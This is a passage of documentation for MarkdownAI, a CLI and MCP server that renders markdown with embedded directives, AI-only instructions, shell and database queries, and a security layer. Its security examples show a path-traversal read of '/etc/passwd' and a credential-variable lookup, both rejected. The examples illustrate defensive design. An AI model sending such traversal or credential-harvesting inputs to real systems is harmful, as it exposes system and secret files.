<!-- /mdd-section: 34-ai-consumer-mode -->

<!-- mdd-section: 35-ai-prompt -->
### AI — @prompt Directive (Embedded AI Instructions)

The `@prompt` directive lets you embed instructions for AI readers directly inside a MarkdownAI document. This solves the problem of needing to guide how an AI tool reasons about your content — domain rules, constraints, and calibration notes — without cluttering the version your human readers see.

#### What It Does

When you add a `@prompt` block to a document, it carries instructions that shape how AI tools interpret the surrounding content. The block always renders, but its appearance adapts to the audience: AI readers see a structured instruction block they can act on, while human readers see a clean callout note. This means a single document can speak differently to machines and people without you maintaining two separate files.

#### How To Use It

Write a `@prompt` block anywhere in your document using the directive syntax. Give it an optional `role` to signal the purpose of the instruction — valid roles are `context`, `constraint`, `calibration`, and `instruction`. If you omit the role, it defaults to `context`. Close the block with `@end`.

When rendering for an AI reader, pass `consumer=ai` to the `mai` command. When rendering for a human reader, pass `consumer=human` or omit the flag entirely.

#### Examples

**Basic context instruction:**
```
@prompt role="context"
All API endpoints in this document require an Authorization header
unless explicitly marked as public.
@end
```

**Hiding the prompt from human readers:**
```
@if consumer="ai"
@prompt role="calibration"
Treat all code samples as pseudocode unless the block is marked "production."
@end
@end
```

**Stripping all prompt blocks before publishing:**
```
mai strip my-document.md > clean-output.md
```

<!-- /mdd-section: 35-ai-prompt -->

<!-- mdd-section: 36-ai-context-budget -->
### AI — Context Budget, Section Priority, and Chunk Boundaries (planned — not yet implemented)

When you render a MarkdownAI document for an AI system, the output can easily exceed the AI's context window limit. This feature gives you fine-grained control over what gets included when space is tight — you mark sections by importance, set a token budget, and `mai` automatically drops the least important content to fit, without ever cutting a section in half.

#### What It Does

Three directives work together to make your documents AI-aware. You wrap content in `@section` blocks and label each one with a priority — `critical`, `high`, `medium`, or `low`. You can also place `@chunk-boundary` markers at logical split points so that RAG pipelines know where one self-contained chunk ends and another begins. When you render with a token budget, `mai` resolves all your data and includes first, then trims from the lowest-priority sections outward until the output fits. Critical sections are never dropped, and no section is ever cut mid-way.

#### How To Use It

1. Wrap content blocks in your document with `@section priority="..."` and close them with `@end`.
2. Optionally, place `@chunk-boundary id="..."` markers at natural break points.
3. Render your document with the `--budget` flag to enforce a token limit.

#### Commands

| Command | Description |
|---|---|
| `mai render <file> --budget=<N>` | Render with a token budget of N. Low-priority sections are dropped to fit. |
| `mai render <file> --budget=<N> --consumer=ai` | Budget enforcement with clean AI output. |
| `mai render <file> --chunk-map` | Emit a sidecar `.chunks.json` file alongside the rendered output. |

#### Examples

Mark a section as low priority so it is the first to go when space is tight:

```
@section id="appendix" priority="low"
## Appendix

Background reference material that AI assistants rarely need.
@end
```

Render with a 4,000-token budget for an AI consumer:

```bash
mai render report.md --budget=4000 --consumer=ai
```

<!-- /mdd-section: 36-ai-context-budget -->

<!-- mdd-section: 37-ai-concepts -->
### AI — @define-concept (Inline Glossary Injection) (planned — not yet implemented)

`@define-concept` lets you register definitions for domain-specific terms directly inside your documents. When an AI reads your document, all definitions are automatically gathered and placed at the top so the AI understands your terminology before encountering it — reducing misinterpretation and hallucination about project-specific language.

#### What It Does

When you write a MarkdownAI document, you can declare what your specialized terms mean using `@define-concept`. At render time, `mai` collects every definition you've declared throughout the document. If the document is being read by an AI, all definitions are injected as a structured glossary block at the very top — so the AI gets a vocabulary lesson before reading your content. If the document is being read by a human, each definition renders in place, right where you wrote it.

#### How To Use It

Write `@define-concept` directives anywhere in your document to register terms. Use the single-line form for short definitions, or the block form for longer ones:

**Single-line form:**
```
@define-concept <term> "<definition>"
```

**Block form:**
```
@define-concept <term>
<Your definition text here.>
@end
```

Once defined, you can reference a concept's definition inline anywhere in the document using `{{ concept.<term> }}`.

#### Examples

**Define a term inline (single-line):**
```
@define-concept jailRoot "the document root directory used to confine file access"
```

**Render with AI glossary injection:**
```bash
mai render my-doc.md --consumer ai
```

The output will begin with a `## Glossary` block listing all defined terms before the rest of the document content.

<!-- /mdd-section: 37-ai-concepts -->

<!-- mdd-section: 38-ai-constraints -->
### AI — @constraint Directive (Machine-Readable Rules) (planned — not yet implemented)

The `@constraint` directive lets you embed machine-readable rules directly inside your documents. Instead of writing rules in prose that AI tools might overlook, you mark them explicitly as constraints — giving AI coding assistants a structured list of rules they can parse, quote, and check against any code they generate.

#### What It Does

When you add `@constraint` blocks to a document, each rule gets a stable identifier and a severity level (critical, high, medium, or low). At render time, MarkdownAI collects all constraints and presents them in a way that matches how the document is being read. If an AI tool is reading the document, it receives a structured table of all constraints at the top — making them impossible to miss. If a human is reading the document, each constraint appears inline as a clearly labeled callout.

#### How To Use It

Add one or more `@constraint` blocks anywhere in your document. Each block needs a unique `id` (a short slug) and an optional `severity`. Write the rule in plain English between the opening and closing tags.

- `id` — required. A stable slug used to identify the rule (e.g. `no-raw-sql`).
- `severity` — optional. One of `critical`, `high`, `medium`, or `low`. Defaults to `high`.

#### Commands

| Command | Description |
|---------|-------------|
| `mai validate <file>` | Lists all `@constraint` IDs and severity levels found in the document |
| `mai strip <file>` | Removes all `@constraint` blocks from the document output |

#### Examples

**Defining constraints in a document:**
```
@constraint id="no-raw-sql" severity="critical"
NEVER pass user input directly to a database query. Always use parameterized queries.
@end

@constraint id="eval-forbidden" severity="critical"
eval() is never used. Use vm.runInNewContext() for expression evaluation.
@end
```

**How constraints appear when an AI tool reads the document:**
```markdown
## Constraints

| ID | Severity | Rule |
|----|----------|------|
| no-raw-sql | CRITICAL | NEVER pass user input directly to a database query. Always use parameterized queries. |
```

<!-- /mdd-section: 38-ai-constraints -->

<!-- mdd-section: 39-ai-format -->
### AI — Token-Efficient Format Mode (`--format=ai`) (planned — not yet implemented)

When AI tools read your documents, they pay a cost in tokens for every decorative element that adds no information. `--format=ai` automatically strips that chrome — horizontal rules, redundant blank lines, standalone bold labels — and compresses the output so AI readers receive the same meaning in significantly fewer tokens.

#### What It Does

When you render a document with `--format=ai`, MarkdownAI runs a post-render compression pass over the output. Decorative separators, trailing whitespace, and purely visual emphasis are removed. Everything that carries real information — headings, code blocks, tables, lists, links, blockquotes, and AI instruction blocks — is kept intact. The result is valid markdown that can be 15–40% smaller in token count. The MCP server uses this mode by default whenever an AI tool requests a document.

#### How To Use It

Pass `--format=ai` to the `render` or `build` command. Use `--tables=kv` alongside it to also convert simple two-column tables into compact key-value pairs, which saves roughly 40% more tokens on those tables.

#### Commands

| Command | Description |
|---|---|
| `mai render <file> --format=ai` | Render and apply AI compression |
| `mai render <file> --format=standard` | Render without compression (explicit default) |
| `mai render <file> --format=ai --tables=kv` | Render with compression and 2-column table conversion |
| `mai build <file> --format=ai -o out.md` | Build and write compressed output to a file |

#### Examples

Render a document for an AI consumer:
```
mai render docs/api-reference.md --format=ai
```

Render with maximum compression:
```
mai render docs/changelog.md --format=ai --tables=kv
```

<!-- /mdd-section: 39-ai-format -->

<!-- mdd-section: 40-ai-e2e-accuracy -->
### AI — E2E Accuracy Tests and Format Benchmarks (planned — not yet implemented)

This feature provides a comprehensive end-to-end test suite that verifies every AI-native capability in MarkdownAI works correctly together. It also measures and reports how much token overhead the AI-optimized output format removes compared to standard rendering.

#### What It Does

When you run the AI test suite, it exercises all six AI-native features — consumer targeting, prompt instructions, context budgeting, concepts and constraints, and the AI format filter — using a set of purpose-built fixture documents. Each test confirms that the right content appears for the right audience (AI vs. human), that no raw directives leak into the final output, and that critical sections are never dropped regardless of budget constraints. After the accuracy tests pass, the suite runs a benchmark pass and writes a human-readable report showing exactly how many tokens were saved by using the AI format.

#### How To Use It

Run the AI end-to-end tests using:

```bash
mai test --suite=ai
```

#### Examples

Run the full AI test suite:
```bash
mai test --suite=ai
```

Inspect the benchmark report after tests pass:
```
e2e/benchmarks/ai-format-report.md
```

<!-- /mdd-section: 40-ai-e2e-accuracy -->

---

### MCP End-to-End

<!-- mdd-section: 41-mcp-e2e-protocol -->
### MCP E2E — Protocol Conformance

MarkdownAI exposes a Model Context Protocol (MCP) server that AI assistants and other tools connect to. This feature ensures that server speaks the MCP protocol correctly — that the handshake works, tools are advertised properly, and errors come back as clean error messages rather than crashes.

#### What It Does

When `mai serve` starts, it waits for clients to connect and communicate over a standard JSON-RPC protocol. This feature verifies the full conversation between a client and the server from start to finish: the initial handshake that establishes the connection, the listing of all available tools with their proper descriptions and input requirements, the dispatching of tool calls to the right handlers, and the correct handling of bad requests (unknown tools, missing parameters, malformed messages). The goal is to guarantee that any MCP-compatible client — including AI assistants like Claude — can connect to a MarkdownAI server and get predictable, well-formed responses every time.

#### How To Use It

This feature operates automatically in the background. As a user, what you benefit from is a reliable `mai serve` command. When you start the MCP server and connect an AI assistant to it, you can trust that:

1. The server completes the handshake and announces itself as `markdownai`.
2. The tool list (`tools/list`) returns all 8 built-in tools with correct schemas.
3. If you send a request for a tool that does not exist, you get a proper error response — not a crash.
4. If you send a malformed message, the server recovers and keeps running.
5. When you disconnect, the server shuts down cleanly with no lingering processes.

#### Examples

Start the MCP server:

```bash
mai serve
```

A well-formed handshake looks like:

```json
// Client sends:
{ "jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {} }

// Server responds with:
{ "jsonrpc": "2.0", "id": 1, "result": { "protocolVersion": "...", "serverInfo": { "name": "markdownai" }, "capabilities": { "tools": {} } } }
```

<!-- /mdd-section: 41-mcp-e2e-protocol -->

<!-- mdd-section: 42-mcp-e2e-tools -->
### MCP E2E — All 8 Tools End-to-End (planned — not yet implemented)

MarkdownAI exposes a set of tools that AI assistants like Claude can call directly while working inside your documents. This feature validates that all eight of those tools behave correctly — from reading files and navigating document phases to running macros, fetching environment variables, and clearing cached output.

#### What It Does

When Claude (or another AI) opens a MarkdownAI document, it can call built-in tools to interact with the document's structure and data. These tools let an AI read rendered content, move through multi-phase documents step by step, invoke reusable macros, look up environment values, execute individual directives, and reset cached results.

The eight tools available are:

- **read_file** — reads and renders a MarkdownAI document, expanding all directives
- **list_phases** — lists all phases defined in a document and their allowed transitions
- **resolve_phase** — renders the content of a specific named phase
- **next_phase** — returns the name of the phase that follows the current one
- **call_macro** — runs a named macro defined in a document, optionally passing parameters
- **get_env** — retrieves an environment variable by name, with an optional fallback value
- **execute_directive** — runs a single MarkdownAI directive and returns its output
- **invalidate_cache** — clears cached rendered output for a specific file or all files

#### Examples

Resolving a specific phase in a document:
```
resolve_phase({ file: "onboarding.md", phase: "setup" })
```

Calling a macro with a parameter:
```
call_macro({ file: "report-template.md", macro: "summary-block", args: { period: "Q1 2026" } })
```

Clearing the session cache for a single file after its source data changes:
```
invalidate_cache({ file: "live-metrics.md" })
```

<!-- /mdd-section: 42-mcp-e2e-tools -->

<!-- mdd-section: 43-mcp-e2e-security -->
### MCP E2E — Security Enforcement at MCP Boundary (planned — not yet implemented)

MarkdownAI enforces strict security rules at its MCP interface — the layer that AI assistants like Claude use to interact with your documents. This feature verifies that malicious or misconfigured requests cannot access files outside your project, expose credentials from your environment, or inject harmful directives through that interface.

#### What It Does

When an AI tool communicates with MarkdownAI over MCP, every request passes through a security checkpoint before anything happens. The security layer blocks attempts to read files outside your document folder (path traversal attacks), prevents sensitive environment variables like passwords and API keys from leaking in responses, and sanitizes directives to stop injection attacks. Critically, the server stays running even after it receives a malicious request — a single bad call cannot crash or hang your session.

The protections apply to all four operations exposed via MCP:

1. **File reads** — only files inside your project's document root can be read; paths attempting to escape are rejected.
2. **Phase resolution** — file arguments are validated the same way before any phase is resolved.
3. **Environment variable access** — keys matching credential patterns are blocked; safe keys like `NODE_ENV` and `PATH` pass through normally.
4. **Directives and macros** — shell-injection sequences and credential references in directive text are blocked.

#### Examples

```
# A path traversal attempt — rejected, server stays alive
read_file({ path: "../../../etc/passwd" })
→ error: path outside document root

# A credential key — blocked, value never appears in the response
get_env({ key: "MONGO_PASSWORD" })
→ error: key matches credential filter
```

<!-- /mdd-section: 43-mcp-e2e-security -->

<!-- mdd-section: 44-mcp-e2e-ai-integration -->
### MCP E2E — AI-Native Integration and Realistic Claude Workflow (planned — not yet implemented)

MarkdownAI documents are "AI-native" — they carry built-in instructions, glossary terms, and safety constraints that AI assistants like Claude can read directly through the MCP interface. This feature ensures that when an AI opens a MarkdownAI document, it receives a compact, pre-filtered view of the document rather than raw markdown, and can query the document's constraints and phases step-by-step.

#### What It Does

When an AI assistant connects to a MarkdownAI project via the MCP server, every document it reads is automatically delivered in AI format: token-efficient, with decorative noise removed, inline glossary definitions surfaced at the top, and `@prompt` instruction blocks rendered as clearly labeled AI instructions. The AI can also ask the document for its constraint list — rules like "never use eval()" — sorted by severity. Documents that model multi-phase workflows expose each phase independently, letting an AI walk through implementation, review, and other stages in order without loading the entire document at once.

#### How To Use It

This feature works automatically when an AI assistant connects to the MCP server. The key behaviors are:

1. **Open a document via MCP** — the AI receives a shorter, filtered version of the document by default.
2. **Control how much context the AI receives** — pass a `budget` value (in tokens) to `read_file`.
3. **Query document constraints** — use the `get_constraints` tool with a file path.
4. **Walk document phases** — use `list_phases`, `resolve_phase`, and `next_phase` in sequence.

#### Commands

| Tool | Description |
|---|---|
| `read_file` | Read a document in AI format (default) or standard format. Accepts an optional `budget`. |
| `get_constraints` | Return all `@constraint` blocks from a document, sorted by severity (critical first). |
| `list_phases` | List all phases defined in a document and their allowed transitions. |
| `resolve_phase` | Render a specific named phase in AI format. |
| `next_phase` | Return the name of the next phase after a given phase, or null if it is the last. |
| `invalidate_cache` | Clear the cached render for a file so the next read reflects any changes. |

#### Examples

Read with a token budget — drops low-priority sections to fit within the limit:
```
read_file({ path: "architecture.md", budget: 50 })
```

Retrieve all safety constraints from a document:
```
get_constraints({ file: "architecture.md" })
// Returns: [{ id: "no-eval", severity: "critical", body: "..." }, ...]
```

Walk a two-phase workflow from start to finish:
```
list_phases({ file: "pipeline.md" })
resolve_phase({ file: "pipeline.md", phase: "implementation" })
next_phase({ file: "pipeline.md", phase: "implementation" })
// → "review"
resolve_phase({ file: "pipeline.md", phase: "review" })
next_phase({ file: "pipeline.md", phase: "review" })
// → null
```

<!-- /mdd-section: 44-mcp-e2e-ai-integration -->

<!-- mdd-section: 45-mdd-markdownai-integration -->
### MDD + MarkdownAI Integration

MDD and MarkdownAI were built for each other. MDD is a workflow that enforces "document first" development - every feature is written down before any code is written, and those documents stay authoritative throughout the project. MarkdownAI makes documents execute. The integration closes the loop: MDD's own artifacts stop being static files that drift, and start being live documents that reflect the actual state of the project every time they render.

This document is a discovery map of all the places where that integration pays off.

#### What It Does

Ten concrete improvement areas were identified when analyzing MDD's current static-markdown architecture against what MarkdownAI can do:

**Live session context.** `.mdd/.startup.md` can have a `@markdownai` header and query its own data on render - current branch, feature counts by status, last audit summary, recent commits. A pre-session hook runs `mai render .mdd/.startup.md` before Claude is invoked. Claude always enters the session with accurate project state, not whatever `.startup.md` said last week.

**Live dependency graph.** `.mdd/connections.md` - the path tree and Mermaid dependency diagram - can be rendered by `mai render` instead of rebuilt by Claude. No more "rebuild connections" step after every doc change. Add `mai validate .mdd/connections.md` to CI and broken `depends_on` references surface automatically.

**Self-verifying feature docs.** A feature doc that says `status: complete` can include a live section that checks whether its `source_files` actually exist and whether typecheck passes. `mai render .mdd/docs/05-lang-header.md` shows the current truth, not the truth at doc-writing time.

**Executable ops runbooks.** Add `@phase` blocks to ops runbooks and they become self-validating procedures. Pre-flight failures stop before deployment happens. Health checks show actual HTTP responses. `@env required` prevents running a deploy without credentials set.

**Live audit reports.** Embed `@include` references pointing at the actual source lines in each finding. When a bug is fixed, re-rendering the audit report shows the fix in place - no new audit run needed to confirm.

**Mode files as live documents.** The branch guard, bootstrap check, and connections rebuild logic that appear across all MDD mode files become `@define` macros in a shared `@import`ed library. Every occurrence becomes `@call branch-guard` - one change propagates everywhere.

**MCP phase navigation.** Mode file phases (`@phase understand`, `@phase document`, etc.) become trackable by the `mai-serve` MCP server. After context compaction, Claude calls `list_phases` and immediately knows which phase was active. No repeated work, no re-asking answered questions.

#### How To Use It

The quick wins require no new MarkdownAI features - they use directives already in Waves 1-2:

1. Add `@markdownai` to `.mdd/.startup.md` and configure the pre-session hook to run `mai render` before Claude is invoked.
2. Add `@markdownai` to `.mdd/connections.md` and replace the Claude rebuild with `mai render`.
3. Add `@include source_file lines=N-M` references to existing audit reports so findings show current code.
4. Bootstrap new projects with a live `.startup.md` template that already has `@markdownai` - no `(unknown)` placeholders.

For larger investments: convert MDD mode files to use `@define`/`@import` macros (requires the mddv2 initiative), then add `@phase` blocks and MCP integration for phase-state persistence across context compaction.

#### The Philosophical Payoff

MDD enforces "document first." MarkdownAI enforces "documentation that cannot lie." Applied to MDD's own artifacts, the combination means: the workflow tool itself is managed by its own principles. A `.startup.md` rendered from live queries cannot be stale. A `connections.md` built by `mai render` cannot reference a doc that doesn't exist.

<!-- /mdd-section: 45-mdd-markdownai-integration -->

<!-- mdd-section: 46-mdd-token-optimization-analysis -->
### MDD Token Economics and Accuracy Analysis

A concrete, numbers-based analysis of what happens when MDD mode files are converted to use MarkdownAI. Measured from the actual codebase.

#### What It Does

The current MDD system loads approximately 10,234 tokens per session (the router file plus the active mode file plus `.startup.md`). The content breaks down as roughly 37% narrative prose - explanations of why rules exist, written for human readers. Claude doesn't need the why; it needs the what and when.

**Token savings by transformation:**

| Approach | Savings per session |
|----------|---------------------|
| `@define` macros (branch guard, connections, startup) | ~840 tokens |
| `@if` conditional sections (greenfield skip, type gates) | ~400-780 tokens |
| Live `.startup.md` replacing mid-session re-reads | ~750 tokens |
| `@consumer=ai` narrative stripping (Wave 5) | ~1,416 tokens |
| `@phase` lazy loading via MCP (only active phase visible) | ~3,000-5,000 tokens |

Conservative optimization (macros + conditionals + live startup): **~19-23% reduction** from baseline.
With narrative stripping: **~35% reduction**.
Full optimization with MCP phase loading: **~64-84% reduction**.

The MCP phase-loading estimate is wide because it depends on session length. A full Phase 1-7 build compresses the most; a quick `/mdd status` call barely changes.

#### Accuracy Improvements

Token savings matter, but the accuracy case is more important.

**Attention dilution.** In a current mdd-build.md Phase 6 session, the "5 iterations max, then STOP" rule is buried at line 540 of 780 within a conversation that may be 40,000-70,000 tokens long. With `@phase` lazy loading, Phase 6 instructions are at the top of context when Phase 6 begins. Specific rule compliance improves by an estimated 20-35%.

**Stale context errors.** A `.startup.md` that is days or weeks old causes real mistakes: Claude suggests rebuilding a feature that is already complete, auto-branches incorrectly because the branch field is wrong, tries to re-apply fixes that were already applied. With live `.startup.md`, this error class is fully eliminated.

**Prose rules vs structured constraints.** Rules written as narrative paragraphs compete with other context and get missed. Rules written as `@constraint` blocks, rendered with Wave 5's AI format mode, become machine-readable and consistently applied.

**Phase confusion after context compaction.** Long MDD sessions (a full Phase 1-7 build) frequently hit context compaction. Without MCP phase tracking, Claude re-reads the mode file and may re-execute completed phases. With `mai-serve` persisting phase state, one MCP call re-orients. Estimated 80-90% reduction in phase-confusion rework.

**Audit resolution cost.** For a report with 20 findings, having `@include source_file lines=N-M` embedded in each finding saves approximately 8,000-16,000 tokens in the audit resolution session - Claude sees the current code inline rather than doing separate file reads for each finding.

#### Examples

Before - branch guard as prose (63 lines in mdd-build.md):
```
Before creating or modifying any files, run:
  BRANCH=$(git branch --show-current)
  DIRTY=$(git status --porcelain)
[... 60 more lines explaining each scenario ...]
```

After - branch guard as MarkdownAI (12 lines, executes):
```markdown
@query git branch --show-current
@query git status --porcelain
@if {{ branch }} == "main"
  @if {{ dirty }} != ""
    @constraint STOP - uncommitted changes on {{ branch }}. Choose: (a) commit (b) stash (c) abort
  @else
    @constraint Run: git checkout -b feat/{{ slug }}
  @endif
@endif
```

81% reduction for this section. Claude doesn't read about what to do - the document does it first.

<!-- /mdd-section: 46-mdd-token-optimization-analysis -->

<!-- mdd-section: 47-skill-context-variables -->
### Skill Context Variables — Claude Code Slash Command Integration

When a MarkdownAI document is executed as a Claude Code skill via the MCP `read_file` tool, the full slash command invocation context is available as first-class variables inside `@if` conditions and `{{ }}` interpolations. This enables genuine engine-evaluated dispatch in skill files - the document routes itself based on arguments, rather than embedding prose instructions for Claude to interpret.

#### What It Does

Claude Code passes several variables when invoking a skill: the argument string, the individual positional args, named args declared in the skill frontmatter, the session ID, the effort level, and the skill directory. MarkdownAI exposes all of these in the expression sandbox.

**Available variables in `@if` and `{{ }}`:**

| Variable | Description |
|----------|-------------|
| `ARGUMENTS` or `args` | Full raw argument string from `$ARGUMENTS` |
| `argsList` | Positional args, shell-style parsed (quoted strings kept together) |
| `arg0` `arg1` `arg2` `arg3` | Shorthand for `argsList[0]` through `argsList[3]` |
| `CLAUDE_EFFORT` | Effort level: `low`, `medium`, `high`, `xhigh`, or `max` |
| `CLAUDE_SESSION_ID` | Unique ID for the current Claude Code session |
| `CLAUDE_SKILL_DIR` | Directory containing the skill file |
| Named arg keys | Spread into root scope from skill frontmatter `arguments:` list |

The preprocessor also handles `$ARGUMENTS`, `$ARGUMENTS[N]`, and `$N` (single digit) as aliases, so Claude Code-style syntax works directly in expressions.

#### How To Use It

Dispatch to different behavior based on arguments:

```markdown
@markdownai

@if ARGUMENTS.startsWith("audit")
  @include ./audit-mode.md
@elseif ARGUMENTS.startsWith("build")
  @include ./build-mode.md
@endif
```

Show extra content only for high-effort sessions:

```markdown
@if CLAUDE_EFFORT == "max"
  @include ./extended-analysis.md
@endif
```

Use named args declared in skill frontmatter (e.g., `arguments: [issue, branch]`):

```markdown
@if issue !== ""
Working on issue: {{ issue }}
@endif
```

#### `@query` vs Claude Code's `!`command`` Syntax

Claude Code skill files support a native shell injection syntax, `` !`command` ``, that runs commands before Claude sees the file. MarkdownAI's `@query` covers the same use case with full security gating.

| Control | `@query` | `` !`command` `` (Claude Code) |
|---------|----------|-------------------------------|
| Disabled by default | Yes - `allowShell: false` | No - always runs |
| Command allowlist | Yes | No |
| Deny patterns | Yes | No |
| Filesystem jail | Yes - `jailRoot` confinement | No |
| Immutable block rules | Yes | No |
| Audit log | Yes | No |
| Works outside Claude Code | Yes | No |
| Named output for reuse | Yes - `label=varname` | No - inline only |

`@query` also stores results in a named label, making the output reusable throughout the document and in `@if` conditions. The native `` !`command` `` injects inline only - no label, no conditions, no reuse.

<!-- /mdd-section: 47-skill-context-variables -->

<!-- mdd-section: 48-shell-inline -->
### Shell Inline - Native `!`command`` Interception

Claude Code skill files support a native shell injection syntax, `` !`command` ``. It runs commands before Claude sees the file and injects the output inline. No security gates of any kind.

When the document has a `@markdownai` header, that is not acceptable. MarkdownAI takes ownership of all shell execution within its documents - including `` !`command` `` patterns. Authors can write either syntax and get the same security behavior.

#### What It Does

In any `@markdownai` document, `` !`command` `` is a recognized syntax. The parser emits a `ShellInlineNode`. The engine evaluates it through the same security layer as `@query`.

By default (`allowShell: false`), shell inline commands are blocked. The engine emits a warning and replaces the tag with nothing. When `allowShell: true`, commands run through the deny-pattern check and jailRoot confinement identical to `@query`.

To opt out of interception and let Claude Code handle the command natively:

```
@markdownai shell-inline="passthrough"
```

The opt-out is intentionally named "passthrough" rather than "disable" - the author is explicitly handing control back to Claude Code, which has no security layer.

#### How To Use It

Write shell inline exactly as Claude Code documents it:

```
Current branch: !`git branch --show-current`
Files changed: !`git diff --stat | wc -l`
```

With `allowShell: true` and no matching deny patterns, the commands execute and their output replaces the tag inline.

Shell inline has no label - unlike `@query label=varname`, output is injected at the point it appears and cannot be referenced elsewhere or used in `@if` conditions. For reuse and conditions, use `@query`.

#### Security Comparison

| Control | `@query` | `` !`command` `` via MarkdownAI | `` !`command` `` via Claude Code |
|---------|----------|---------------------------------|----------------------------------|
| Disabled by default | Yes | Yes (same `allowShell`) | No - always runs |
| Command allowlist | Yes | Yes (same gates) | No |
| Deny patterns | Yes | Yes (same gates) | No |
| Filesystem jail | Yes | Yes (same jailRoot) | No |
| Immutable block rules | Yes | Yes | No |
| Audit log | Yes | Yes | No |
| Works in any document | Yes | Yes | No - skills only |

Any `@markdownai` document - whether used as a Claude Code skill, a standalone runbook, a spec, or a dashboard - routes all shell execution through the security layer. The document's own header cannot be used as a vector for ungated shell execution, even if the author uses Claude Code's own syntax.

<!-- /mdd-section: 48-shell-inline -->

---

## Command Reference

All `mai` CLI commands, sorted alphabetically. See the individual feature sections for full documentation on each command.

| Command | Description | Feature |
|---------|-------------|---------|
| `mai build <file> -o <output>` | Render a document and write it to disk | CLI Complete |
| `mai cache clear [file]` | Clear cached data for a document or all documents | Caching |
| `mai cache seed <file>` | Pre-populate cache by running all fetches in a document | Caching |
| `mai cache show [file]` | Show cached entries for a document or all documents | Caching |
| `mai eval "<expression>"` | Evaluate a single MarkdownAI expression against your environment | CLI Core |
| `mai init` | Auto-detect your AI client and install the PreToolUse hook | Hook |
| `mai list-imports <file>` | Show the full dependency tree (includes/imports) for a document | CLI Complete |
| `mai list-macros <file>` | List all macros used in a document with their source file | CLI Complete |
| `mai list-phases <file>` | List all phases defined in a document with their transitions | CLI Complete |
| `mai parse <file>` | Parse a document and output its AST as JSON | CLI Core |
| `mai render <file>` | Execute a document and print the fully rendered markdown to stdout | CLI Core |
| `mai security db <subcommand>` | Manage database query jail settings (`add`, `set`, `allow-collection`, `deny-keyword`, `test`) | Security — DB |
| `mai security http <subcommand>` | Manage HTTP request jail settings (`enable`, `add-domain`, `remove-domain`, `test`) | Security — HTTP |
| `mai security init` | Create or import a security policy file | Security — Config |
| `mai security shell <subcommand>` | Manage shell command jail settings (`enable`, `add`, `remove`, `list`, `test`) | Security — Shell |
| `mai security show` | Display the active security policy | Security — Config |
| `mai serve` | Start the MCP server | MCP Server |
| `mai strip <file>` | Remove all MarkdownAI directives, producing plain markdown | Stripper |
| `mai test --suite=ai` | Run the AI-native end-to-end test suite | AI E2E |
| `mai validate <file>` | Check a document for errors and warnings without rendering | CLI Core |
| `mai watch <file> -o <output>` | Watch a document for changes and re-render automatically | CLI Complete |

---

## Configuration Reference

Key configuration options across all features. For full details, see the individual feature section.

### @list — Filesystem and Structured Data

| Option | Default | Description |
|--------|---------|-------------|
| `match` | `*` | Glob pattern for filesystem listing |
| `type` | `files` | What to list: `files`, `dirs`, or `both` |
| `depth` | Unlimited | How many folder levels deep to search |
| `path` | Root | Dot-notation key into a JSON file |
| `mode` | None | How to read a JSON object: `keys`, `values`, `entries` |
| `columns` | All fields | Fields to show and their display labels |
| `where` | None | Filter rows by a field value |
| `as` | None | Output format shorthand (e.g. `table`, `list`) |
| `@cache` | None | `session`, `persist`, or `ttl=N` |

### @read — Structured File Access

| Option | Applies To | Description |
|--------|-----------|-------------|
| `path="dot.notation"` | JSON, YAML, TOML | Navigate to a nested value |
| `key="KEY_NAME"` | .env | Look up a single flat key |
| `column="name"` | CSV | Extract one column |
| `where=` | CSV | Filter rows using an expression |
| `columns="key:Label"` | CSV | Select and rename multiple columns |
| `collapse true` | Any | Stringify nested objects inline |
| `@cache` | Any | Cache the file read result |

### @http — HTTP Requests

| Option | Default | Description |
|--------|---------|-------------|
| `url=` | Required | The endpoint to call |
| `method=` | `GET` | HTTP verb |
| `path=` | — | Dot-path selector into a JSON response |
| `headers=` | — | Comma-separated request headers |
| `timeout=` | 10000 ms | Request timeout |
| `@cache` | — | `session`, `persist`, `ttl=N`, or `mock=./file` |

### @db — Database Queries

| Option | Description |
|--------|-------------|
| `using="name"` | Name of a `@connect` connection |
| `uri=env.VAR` | Inline connection URI from an environment variable |
| `query="..."` | The query to run |
| `columns="field:Label"` | Select and rename result fields |
| `where="expression"` | Post-query filter |
| `as="type"` | Output format shorthand |
| `@cache` | `session`, `persist`, `ttl=N`, or `mock=./file` |

### Security — Shell

| Option | Default | Description |
|--------|---------|-------------|
| `shell.enabled` | `false` | Master switch for `@query` shell execution |
| `shell.allow_patterns` | `[]` | Glob patterns for permitted commands |
| `shell.deny_patterns` | `[]` | Glob patterns for always-blocked commands |
| `shell.allow_network` | `false` | Whether shell commands may make network calls |
| `shell.audit_log` | `true` | Record all shell execution attempts |

### Security — HTTP

| Option | Default | Description |
|--------|---------|-------------|
| `http.enabled` | `false` | Master switch for `@http` outbound requests |
| `http.allowed_domains` | `[]` | Domains `@http` may contact |
| `http.denied_domains` | `[]` | Domains that are always blocked |
| `http.allowed_methods` | `["GET"]` | HTTP methods permitted |
| `http.max_response_size` | 1 MB | Maximum response body size in bytes |
| `http.timeout` | 10000 ms | Request timeout |

### Security — Database

| Option | Default | Description |
|--------|---------|-------------|
| `allowed_operations` | All read ops | Query operations permitted |
| `denied_keywords` | None | Additional SQL/query keywords to block |
| `allowed_collections` | All | Collections/tables that may be queried |
| `readonly` | `true` | Enforce strict read-only access |
| `max_results` | `1000` | Maximum rows/documents per query |

### @cache — Caching Modifier

| Mode | Behavior |
|------|----------|
| `@cache session` | Store result in memory for the current session |
| `@cache ttl=N` | Session cache that expires after N seconds |
| `@cache persist` | Write result to disk across restarts |
| `@cache persist ttl=N` | Disk cache that expires after N seconds |
| `@cache mock=./file.json` | Always return data from a local file; never call the live source |
